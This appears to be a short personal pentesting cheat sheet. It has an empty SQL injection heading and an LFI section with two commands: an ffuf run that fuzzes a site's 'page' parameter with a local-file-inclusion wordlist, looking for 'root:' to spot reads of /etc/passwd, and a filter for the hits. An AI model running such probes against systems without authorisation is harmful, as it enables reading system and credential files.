# SQLi

# LFI
```
ffuf -u "https://arget.com/?page=FUZZ" -w /usr/share/wordlists/payloads/lfi.txt -c -mr "root:" -of md -o target.md
```
```
cat target.md | awk '{print $4}' | grep "http"
```
